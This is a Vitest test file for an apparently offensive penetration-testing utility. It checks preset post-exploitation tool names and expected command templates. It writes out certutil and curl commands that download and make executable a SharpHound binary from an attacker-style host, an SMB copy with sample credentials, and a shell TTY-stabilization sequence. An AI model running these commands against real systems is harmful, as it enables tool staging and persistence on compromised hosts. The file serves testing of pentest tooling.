import { describe, it, expect } from 'vitest';
import {
  COMMON_TRANSFER_TOOLS,
  generateFileTransferMethods,
  generateTtyStabilizationSteps,
} from './offensiveTransferUtils';

describe('offensiveTransferUtils', () => {
  it('exposes common offensive transfer tool presets', () => {
    expect(COMMON_TRANSFER_TOOLS).toContain('linpeas.sh');
    expect(COMMON_TRANSFER_TOOLS).toContain('winPEASx64.exe');
    expect(COMMON_TRANSFER_TOOLS).toContain('ligolo-agent');
    expect(COMMON_TRANSFER_TOOLS).toContain('chisel');
    expect(COMMON_TRANSFER_TOOLS).toContain('pspy64');
    expect(COMMON_TRANSFER_TOOLS).toContain('SharpHound.exe');
  });

  it('generates dynamic transfer methods with custom lhost, lport, and filename', () => {
    const methods = generateFileTransferMethods({
      lhost: '10.10.14.33',
      lport: 8443,
      filename: 'SharpHound.exe',
      user: 'admin',
      cred: 'Secret123!',
      targetIp: '10.10.10.200',
    });

    expect(methods.length).toBeGreaterThan(10);

    const certutil = methods.find((m) => m.id === 'win-certutil');
    expect(certutil?.commandTemplate).toBe(
      'certutil -urlcache -split -f "http://10.10.14.33:8443/SharpHound.exe" SharpHound.exe'
    );

    const curl = methods.find((m) => m.id === 'lin-curl-out');
    expect(curl?.commandTemplate).toBe(
      'curl -s -L "http://10.10.14.33:8443/SharpHound.exe" -o SharpHound.exe && chmod +x SharpHound.exe'
    );

    const smb = methods.find((m) => m.id === 'win-smb-copy');
    expect(smb?.commandTemplate).toContain('net use \\\\10.10.14.33\\tools /u:admin Secret123!');
    expect(smb?.commandTemplate).toContain('copy \\\\10.10.14.33\\tools\\SharpHound.exe');
  });

  it('generates interactive 5-stage TTY stabilization sequence', () => {
    const steps = generateTtyStabilizationSteps({ rows: 45, cols: 120 });
    expect(steps.length).toBe(5);

    expect(steps[0].command).toContain('pty.spawn("/bin/bash")');
    expect(steps[1].command).toBe('Ctrl + Z');
    expect(steps[1].isKeystroke).toBe(true);
    expect(steps[2].command).toBe('stty raw -echo; fg');
    expect(steps[3].command).toContain('export TERM=xterm-256color');
    expect(steps[4].command).toBe('stty rows 45 columns 120');
  });
});
